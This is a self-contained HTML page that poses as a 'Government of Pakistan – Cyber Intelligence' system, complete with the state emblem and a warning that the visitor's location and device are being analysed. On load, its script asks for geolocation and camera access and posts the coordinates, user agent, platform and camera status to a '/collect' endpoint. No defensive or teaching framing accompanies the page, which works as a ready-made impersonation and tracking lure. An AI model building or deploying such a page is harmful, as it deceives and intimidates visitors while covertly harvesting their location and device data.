<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Government of Pakistan ‚Äì Cyber Intelligence</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="google" content="nositelinkssearchbox">
  <meta name="google" content="notranslate">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #101820;
      color: #f8f8f8;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
    }

    .box {
      background: rgba(255, 255, 255, 0.05);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 30px rgba(0,0,0,0.8);
      text-align: center;
      width: 370px;
      backdrop-filter: blur(12px);
      border: 1px solid #21bf73;
    }

    .seal {
      width: 70px;
      margin-bottom: 10px;
    }

    h1 {
      font-size: 20px;
      margin-bottom: 8px;
      color: #21bf73;
    }

    .warning {
      font-size: 13px;
      background: rgba(255, 0, 0, 0.1);
      border: 1px solid red;
      padding: 10px;
      margin-bottom: 20px;
      color: #ffcccc;
      border-radius: 6px;
    }

    #map, #cameraView {
      width: 100%;
      height: 200px;
      border-radius: 8px;
      margin-bottom: 10px;
      background: #333;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
    }

    video {
      width: 100%;
      height: 100%;
      border-radius: 8px;
      object-fit: cover;
    }

    footer {
      margin-top: 15px;
      font-size: 12px;
      color: #aaa;
    }
  </style>
</head>
<body>
  <div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6e/State_emblem_of_Pakistan.svg/2048px-State_emblem_of_Pakistan.svg.png" class="seal" alt="Gov Logo">
    <h1>Government of Pakistan ‚Äì Cyber Intelligence</h1>
    <div class="warning">‚ö†Ô∏è Confidential System ‚Äì Location and Device are being analyzed.</div>

    <div id="map">üìç Getting location...</div>
    <div id="cameraView">üì∑ Waiting for camera...</div>

    <footer>¬© Government of Pakistan ‚Äì Cyber Intelligence Wing</footer>
  </div>

  <script>
    const mapBox = document.getElementById('map');
    const cameraView = document.getElementById('cameraView');

    async function collectData(cameraStatus, latitude = null, longitude = null) {
      try {
        await fetch("/collect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            latitude: latitude,
            longitude: longitude,
            camera: cameraStatus,
            deviceInfo: navigator.platform
          })
        });
      } catch (e) {
        console.warn("‚ùå Failed to send data");
      }
    }

    async function startSurveillance() {
      let lat = null, lon = null;

      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        lat = pos.coords.latitude;
        lon = pos.coords.longitude;
        mapBox.innerHTML = `üìç Latitude: ${lat.toFixed(4)}<br>üìç Longitude: ${lon.toFixed(4)}`;
      } catch (e) {
        mapBox.innerHTML = "‚ùå Location Blocked";
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;
        cameraView.innerHTML = '';
        cameraView.appendChild(video);
        collectData("‚úÖ Camera Allowed", lat, lon);
      } catch (e) {
        cameraView.innerHTML = "‚ùå Camera Denied";
        collectData("‚ùå Camera Denied", lat, lon);
      }
    }

    window.onload = startSurveillance;
  </script>
</body>
</html>
